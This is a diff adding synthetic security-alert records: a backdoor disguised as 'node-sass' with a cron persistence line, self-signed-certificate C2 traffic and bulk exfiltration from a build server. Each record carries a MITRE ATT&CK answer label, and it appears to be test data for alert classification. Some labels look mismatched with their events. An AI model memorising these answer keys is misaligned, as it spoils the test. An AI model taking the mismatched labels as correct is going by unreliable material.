+    "alert_name": "Process Masquerading as Legitimate Name",
+    "alert_description": "后门进程将自身重命名为 'node-sass'（合法 npm 包名），并移动到 /usr/local/bin/ 目录，伪装成系统工具以逃避检测，实际行为包含网络通信和文件读写",
+    "raw_payload": {
+      "malicious_path": "/tmp/backdoor",
+      "masquerade_path": "/usr/local/bin/node-sass",
+      "legitimate_process": "node-sass (node-sass@6.0.1)",
+      "file_size_mismatch": true,
+      "digital_signature": null,
+      "unexpected_network_activity": true,
+      "cron_entry_added": "*/5 * * * * /usr/local/bin/node-sass --daemon"
+    },
+    "ground_truth": {
+      "tactic": "DefenseEvasion",
+      "technique_id": "T1036.005",
+      "technique_name": "Match Legitimate Name or Location"
+    }
+  },
+  {
+    "event_id": "c3d4e5f6-0006-4000-8000-000000000006",
+    "timestamp": "2024-05-08T04:55:40Z",
+    "source_type": "network",
+    "source_system": "zeek",
+    "severity": 3,
+    "risk_score": 7.2,
+    "src_ip": "192.168.30.5",
+    "dst_ip": "198.51.100.77",
+    "src_port": 61234,
+    "dst_port": 443,
+    "protocol": "tls",
+    "user": "ci_runner",
+    "hostname": "BUILD-SRV-01",
+    "alert_name": "Self-Signed Certificate C2 Communication",
+    "alert_description": "检测到与 C2 服务器建立 TLS 连接，服务器证书为自签名（issuer == subject），CN 伪装为 'ssl.cloudflare-cdn.com'，证书有效期仅 7 天，典型的临时 C2 基础设施特征",
+    "raw_payload": {
+      "c2_ip": "198.51.100.77",
+      "cert_subject": "CN=ssl.cloudflare-cdn.com",
+      "cert_issuer": "CN=ssl.cloudflare-cdn.com",
+      "self_signed": true,
+      "cert_valid_days": 7,
+      "cert_serial": "0x01",
+      "tls_version": "TLS 1.3",
+      "ja3_fingerprint": "b32309a26951912be7dba376398abc3",
+      "beacon_interval_seconds": 600
+    },
+    "ground_truth": {
+      "tactic": "DefenseEvasion",
+      "technique_id": "T1553.004",
+      "technique_name": "Install Root Certificate"
+    }
+  },
+  {
+    "event_id": "c3d4e5f6-0007-4000-8000-000000000007",
+    "timestamp": "2024-05-08T08:34:29Z",
+    "source_type": "network",
+    "source_system": "firewall",
+    "severity": 5,
+    "risk_score": 9.5,
+    "src_ip": "192.168.30.5",
+    "dst_ip": "198.51.100.77",
+    "src_port": 61567,
+    "dst_port": 443,
+    "protocol": "https",
+    "user": "ci_runner",
+    "hostname": "BUILD-SRV-01",
+    "alert_name": "Large Scale Data Exfiltration Over HTTPS",
+    "alert_description": "检测到通过 HTTPS 向 C2 服务器大量外传数据，总计 612MB，包含源代码仓库、构建产物、CI/CD 配置文件和所有收集的凭据，传输耗时 3.5 小时",
+    "raw_payload": {
+      "destination_ip": "198.51.100.77",
+      "protocol": "HTTPS",
+      "total_bytes_exfiltrated": 641728512,
+      "transfer_duration_seconds": 12600,
+      "data_categories": [
+        "source_code",
+        "build_artifacts",
+        "ci_cd_configs",
+        "credentials",
+        "env_files"
+      ],
+      "transfer_rate_mbps": 0.41,
+      "chunked_transfer": true,
+      "chunk_size_bytes": 1048576
+    },
+    "ground_truth": {
+      "tactic": "Exfiltration",
+      "technique_id": "T1048.002",
+      "technique_name": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol"
+    }
+  },
+  {
+    "event_id": "c3d4e5f6-0008-4000-8000-000000000008",
+    "timestamp": "2024-05-08T14:18:07Z",
+    "source_type": "network",
+    "source_system": "firewall",
+    "severity": 4,
+    "risk_score": 8.8,
+    "src_ip": "192.168.30.5",
+    "dst_ip": "198.51.100.77",
+    "src_port": 62001,
+    "dst_port": 443,
+    "protocol": "https",
+    "user": "ci_runner",
+    "hostname": "BUILD-SRV-01",
+    "alert_name": "Continuous C2 Channel Exfiltration",
+    "alert_description": "后门持续通过 C2 加密通道回传构建服务器上的实时数据，包括每次新构建产生的代码和凭据，已持续 12 小时，累计外传 1.2GB",
+    "raw_payload": {
+      "c2_ip": "198.51.100.77",
+      "channel_duration_hours": 12,
+      "total_bytes": 1288490188,
+      "exfil_triggers": [
+        "new git commit",
+        "npm install",
+        "docker build"
+      ],
+      "realtime_monitoring": true,
+      "git_repos_accessed": [
+        "frontend",
+        "backend-api",
+        "infra-terraform"
+      ],
+      "new_credentials_harvested_count": 3
+    },
+    "ground_truth": {
+      "tactic": "Exfiltration",
+      "technique_id": "T1041",
+      "technique_name": "Exfiltration Over C2 Channel"
+    }
+  }
+]
